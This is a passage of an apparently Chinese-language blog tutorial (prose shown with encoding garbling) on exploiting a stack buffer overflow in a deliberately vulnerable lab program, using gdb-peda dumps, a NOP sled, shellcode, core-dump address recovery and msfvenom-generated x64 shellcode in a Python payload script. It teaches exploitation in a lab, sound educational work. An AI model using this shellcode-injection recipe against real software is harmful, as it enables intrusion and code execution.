class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd02c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd3a0 --&gt; 0x4300ffff <br>EDX: 0xffffd09e --&gt; 0xffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd098 --&gt; 0xffffd080 --&gt; 0x52e38969 <br>ESP: 0xffffd020 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd020 --&gt; 0x0 <br>0004| 0xffffd024 --&gt; 0x1 <br>0008| 0xffffd028 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd02c --&gt; 0x90909090 <br>0016| 0xffffd030 --&gt; 0x90909090 <br>0020| 0xffffd034 --&gt; 0x90909090 <br>0024| 0xffffd038 --&gt; 0x90909090 <br>0028| 0xffffd03c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x52e38969, argv=0x8de18953) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd020:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd050:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd060:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd070:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd080:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd090:     0xffffd080      0xffffd080      0xffffd080      0xffffd030<br>0xffffd0a0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0b0:     0x00000002      0xffffd154      0xffffd160      0xffffd0e4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>å‘ç°æ ˆçš„ä½ç½®å‘ç”Ÿäº†åç§»ï¼Œebpå˜æˆäº†0xfffffd098</p><p>ä¿®æ”¹æ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">eip = <span class="hljs-string">b&#x27;\xa0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x50\xd0\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure><p>å†æ¬¡å°è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd02c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd3a0 --&gt; 0x4300ffff <br>EDX: 0xffffd09e --&gt; 0xffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd098 --&gt; 0xffffd080 --&gt; 0x52e38969 <br>ESP: 0xffffd020 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd020 --&gt; 0x0 <br>0004| 0xffffd024 --&gt; 0x1 <br>0008| 0xffffd028 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd02c --&gt; 0x90909090 <br>0016| 0xffffd030 --&gt; 0x90909090 <br>0020| 0xffffd034 --&gt; 0x90909090 <br>0024| 0xffffd038 --&gt; 0x90909090 <br>0028| 0xffffd03c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x0, argv=0x8049060 &lt;_start&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd020:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd050:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd060:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd070:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd080:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd090:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0a0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0b0:     0x00000002      0xffffd154      0xffffd160      0xffffd0e4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 9309 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[Attaching after process 9309 vfork to child process 9314]<br>[New inferior 2 (process 9314)]<br>[Detaching vfork parent process 9309 after child exec]<br>[Inferior 1 (process 9309) detached]<br>process 9314 is executing new program: /usr/bin/id<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br>[Inferior 2 (process 9314) exited normally]<br><span class="hljs-meta">$</span><span class="bash"> Warning: not running</span><br>zsh: suspended (tty output)  gdb -q bol<br><br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~/StackOverflowtest]<br>â””â”€$ ./bol $(python3 c.py )<br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br></code></pre></td></tr></table></figure><p>shell å†æ¬¡å¤±è´¥ã€‚åªèƒ½æ¢å¦ä¸€ç§æ–¹å¼ï¼Œé€šè¿‡é”™è¯¯è¾“å‡ºæ¥æ‰¾çœŸæ­£çš„åœ°å€ã€‚</p><p>é€šè¿‡ core dump çš„æ–¹å¼è·å–çœŸå®çš„åœ°å€ï¼š</p><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/bitsec/article/details/81026447">https://blog.csdn.net/bitsec/article/details/81026447</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> äº§ç”Ÿ core æ–‡ä»¶ï¼Œå°±æ˜¯ç¨‹åºè¿è¡Œå‘ç”Ÿæ®µé”™è¯¯æ—¶çš„æ–‡ä»¶ã€‚å†™å…¥é”™è¯¯çš„ ret_addrï¼Œå¯¼è‡´ç¨‹åºé”™è¯¯ï¼Œä¼šå¾—åˆ° core æ–‡ä»¶ï¼Œç„¶åé€šè¿‡è°ƒè¯• core æ–‡ä»¶æ‰¾åˆ°æ­£ç¡®çš„ buf çš„å…¶å®åœ°å€ã€‚</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼Œå¾—åˆ°é”™è¯¯è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657100523<br></code></pre></td></tr></table></figure><p>gdb è°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657100523</span><br>vuln: No such file or directory.<br>[New LWP 9988]<br>Core was generated by `./bol ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½1ï¿½ï¿½Ã°1&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x90909090 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd0a0:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd0b0:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd0c0:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd0d0:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0e0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0xffffd194      0xffffd1a0      0xffffd124<br>0xffffd100:     0xffffd134      0xf7ffdb98      0xf7fc3420      0xf7fa7000<br>0xffffd110:     0x00000001      0x00000000      0xffffd178      0x00000000<br>0xffffd120:     0xf7ffd000      0x00000000      0x00000002      0x08049060<br>0xffffd130:     0x00000000      0x79122a66      0x3de2b676      0x00000000<br></code></pre></td></tr></table></figure><p>å‘ç°æ ˆçš„ä½ç½®å‘ç”Ÿäº†åç§»ï¼Œebp å˜æˆäº† 0xfffffd0d8 </p><p>ä¿®æ”¹æ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eip = b&#x27;\xe0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x90\xd0\xff\xff&#x27;<br></code></pre></td></tr></table></figure><p>å†æ¬¡å°è¯•ï¼ŒæˆåŠŸå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br></code></pre></td></tr></table></figure><h2 id="Adjusting-the-Exploit"><a href="#Adjusting-the-Exploit" class="headerlink" title="Adjusting the Exploit"></a>Adjusting the Exploit</h2><p>When I did it with these values, no adjustment was necessary, but when I was developing this project with slight variations in the vulnerable code, the exloit worked in gdb but not in the real shell.</p><p>Thatâ€™s a common occurrence, and the reason for the NOP sled. If that happens to you, adjust the return value in the exploit file using hexedit until it works.</p><h2 id="64-bit-Linux-program"><a href="#64-bit-Linux-program" class="headerlink" title="64 bit Linux program"></a>64 bit Linux program</h2><p>gdb è°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol_64</span><br>Reading symbols from bol_64...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x40115f: file bol.c, line 6.<br></code></pre></td></tr></table></figure><p>æ­£å¸¸è¿è¡Œï¼Œè¾“å…¥ 8 ä¸ª A ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run AAAAAAAA</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 AAAAAAAA<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdf10 --&gt; 0x0 <br>RSP: 0x7fffffffde90 --&gt; 0x7fffffffe008 --&gt; 0x7fffffffe35a (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde90: 0x00007fffffffe008      0x0000000200000000                                               <br>0x7fffffffdea0: 0x4141414141414141      0x0000000000000000                                                  <br>0x7fffffffdeb0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdec0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffded0: 0x0000000000000000      0x00000000004011c5<br>0x7fffffffdee0: 0x0000000000000000      0x0000000000401180<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000401050<br>0x7fffffffdf00: 0x00007fffffffe000      0x0000000000000000<br>0x7fffffffdf10: 0x0000000000000000      0x00007ffff7dfe7fd<br>0x7fffffffdf20: 0x00007fffffffe008      0x00000002f7fca000<br>0x7fffffffdf30: 0x0000000000401136      0x00007fffffffe339<br>0x7fffffffdf40: 0x0000000000401180      0x8c588bd5ae89821a<br>0x7fffffffdf50: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdf60: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf70: 0x73a7742a10c9821a      0x73a7646a61e5821a<br>0x7fffffffdf80: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf90: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdfa0: 0x00007fffffffe008      0x00007fffffffe020<br>0x7fffffffdfb0: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdfc0: 0x0000000000000000      0x0000000000401050<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œæ•°æ®æ˜¯ä» 0x7fffffffdea0 å¼€å§‹å†™å…¥çš„ï¼ŒRBP ä¸º 0x7fffffffdf10 ï¼Œå¯ä»¥è®¡ç®—å‡ºåç§»é‡ä¸ºï¼š120 ã€‚åŒæ—¶ï¼Œå¯ä»¥å°†è¿”å›åœ°å€è®¾ä¸ºï¼š 0x7fffffffdea0 </p><p>æ„é€  payloadï¼š</p><p>shellcode:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x64/<span class="hljs-built_in">exec</span> -f python -b <span class="hljs-string">&quot;\x00\x0a\x09\x20&quot;</span></span><br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No arch selected, selecting arch: x64 from the payload<br>Found 4 compatible encoders<br>Attempting to encode payload with 1 iterations of generic/none<br>generic/none failed with Encoding failed due to a bad character (index=9, char=0x00)<br>Attempting to encode payload with 1 iterations of x64/xor<br>x64/xor succeeded with size 63 (iteration=0)<br>x64/xor chosen with final size 63<br>Payload size: 63 bytes<br>Final size of python file: 318 bytes<br>buf =  b&quot;&quot;<br>buf += b&quot;\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05&quot;<br>buf += b&quot;\xef\xff\xff\xff\x48\xbb\x70\x9f\x3b\x04\xb2\x3b\x22&quot;<br>buf += b&quot;\x94\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;<br>buf += b&quot;\x38\x27\x14\x66\xdb\x55\x0d\xe7\x18\x9f\xa2\x54\xe6&quot;<br>buf += b&quot;\x64\x70\xca\x1a\xa4\x63\x0b\xb7\x3b\x22\x94&quot;<br></code></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>buf =  <span class="hljs-string">b&quot;&quot;</span><br>buf += <span class="hljs-string">b&quot;\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05&quot;</span><br>buf += <span class="hljs-string">b&quot;\xef\xff\xff\xff\x48\xbb\x55\x49\x24\x27\x62\x47\xc7&quot;</span><br>buf += <span class="hljs-string">b&quot;\xa6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;</span><br>buf += <span class="hljs-string">b&quot;\x1d\xf1\x0b\x45\x0b\x29\xe8\xd5\x3d\x49\xbd\x77\x36&quot;</span><br>buf += <span class="hljs-string">b&quot;\x18\x95\xf8\x3f\x72\x7c\x28\x67\x47\xc7\xa6&quot;</span><br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * (<span class="hljs-number">120</span> - <span class="hljs-number">63</span>)<br>rip = <span class="hljs-string">b&#x27;\xa0\xde\xff\xff\xff\x7f&#x27;</span><br><br>sys.stdout.buffer.write(buf+nopsled+rip)<br></code></pre></td></tr></table></figure><p>gdbè°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 d.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 $(python3 d.py)<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdea0 --&gt; 0x9090909090909090 <br>RSP: 0x7fffffffde20 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e4 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde40: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffde50: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffde60: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffde70: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde80: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde90: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdea0: 0x9090909090909090      0x00007fffffffdea0<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0x604b72b9b6bfe19c<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x9fb48d460bdfe19c      0x9fb49d0679d3e19c<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br></code></pre></td></tr></table></figure><p>å‘ç°æ ˆå‘ç”Ÿåç§»äº†ï¼Œè¿™æ¬¡æ•°æ®æ˜¯ä» 0x7fffffffde30 å¼€å§‹å†™å…¥çš„ï¼Œä¿®æ”¹ripï¼šrip = bâ€™\x30\xde\xff\xff\xff\x7fâ€™</p><p>å†æ¬¡è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 d.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 $(python3 d.py)<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdea0 --&gt; 0x9090909090909090 <br>RSP: 0x7fffffffde20 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e4 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde40: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffde50: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffde60: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffde70: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde80: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde90: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdea0: 0x9090909090909090      0x00007fffffffde30<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0xc56a50d696c8e814<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x3a95af292ba8e814      0x3a95bf6959a4e814<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 3996 is executing new program: 